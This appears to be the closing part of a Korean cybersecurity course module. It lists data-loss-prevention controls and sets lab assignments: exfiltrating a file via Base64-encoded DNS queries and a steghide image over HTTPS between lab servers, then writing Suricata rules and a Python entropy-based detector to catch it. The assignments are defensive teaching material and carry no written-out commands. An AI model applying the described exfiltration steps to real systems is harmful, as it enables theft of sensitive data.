(1) 데이터 분류 체계 수립 및 전사 적용: 모든 데이터에 기밀 등급을 부여한다. (2) 최소 권한 원칙(PoLP) 적용: 업무에 필요한 최소한의 데이터 접근 권한만 부여한다. (3) 정기적 보안 인식 교육: 내부자 위협과 소셜 엔지니어링에 대한 인식 제고. (4) 퇴직자/전보자 데이터 접근 즉시 회수 절차. (5) 물리 보안: USB 포트 비활성화, 모바일 기기 반입 통제, CCTV 모니터링. (6) 감사 로그 정기 리뷰 및 이상 접근 패턴 분석. (7) 사고 대응 계획(IR Plan) 수립 및 정기 훈련.

---

## 과제

### 과제 1: 종합 유출 시나리오 구현 (필수)

다음 시나리오를 순서대로 구현하고, 각 단계의 스크린샷과 명령어 로그를 제출하시오.

1. web 서버에서 민감 데이터 파일(최소 500바이트)을 생성한다
2. 해당 파일을 DNS 쿼리를 통해 opsclaw 서버로 유출한다 (수동 Base64 인코딩 방식)
3. opsclaw 서버에서 DNS 캡처 로그로부터 원본 데이터를 복원한다
4. 동일 데이터를 steghide로 이미지에 은닉한 후 HTTPS를 통해 유출한다
5. secu 서버에서 두 가지 유출 시도를 각각 탐지할 수 있는 Suricata 규칙을 작성한다
6. 작성한 규칙이 유출 트래픽에 정상적으로 경보를 발생시키는지 검증한다

**제출물**: 명령어 로그, 캡처 화면, Suricata 규칙 파일, 탐지 결과 로그

### 과제 2: DNS 유출 탐지 자동화 스크립트 (필수)

Python 스크립트를 작성하여 다음 기능을 구현하시오.

1. PCAP 파일 또는 실시간 DNS 트래픽을 입력으로 받는다
2. 각 DNS 쿼리의 서브도메인 길이, Shannon 엔트로피, 문자 분포를 계산한다
3. 정상/이상 트래픽을 분류하여 보고서를 생성한다 (임계값 설정 가능)
4. 이상 트래픽 발견 시 경보 메시지를 출력한다

**요구사항**: argparse를 사용한 CLI 인터페이스, JSON 형식 보고서 출력, 테스트 PCAP 파일 포함

### 과제 3: DLP 전략 보고서 (선택)

가상의 중견기업(직원 500명, IT 인프라 자체 운영, AWS 클라우드 병행)을 대상으로 종합 DLP 전략 보고서를 작성하시오.

포함 항목:
- 데이터 분류 체계 (4등급)
- 유출 채널별 위험 분석 (DNS, HTTPS, 클라우드, USB, 이메일)
- 계층별 대응 방안 (네트워크/엔드포인트/클라우드)
- 도입 우선순위와 예산 추정
- 탐지 규칙 예시 (Suricata/Wazuh 각 3개 이상)

**분량**: A4 5페이지 이상, **형식**: Markdown 또는 PDF

---

## 참고 자료

- MITRE ATT&CK Exfiltration (TA0010): https://attack.mitre.org/tactics/TA0010/
- dnscat2 GitHub: https://github.com/iagox86/dnscat2
- iodine DNS Tunnel: https://github.com/yarrick/iodine
- steghide 공식 문서: https://steghide.sourceforge.net/documentation.php
- Suricata DNS 키워드: https://docs.suricata.io/en/latest/rules/dns-keywords.html
- SANS DNS Exfiltration 분석 백서: https://www.sans.org/white-papers/dns-tunneling/
- OpsClaw 외부 마스터 가이드: `docs/api/external-master-guide.md`
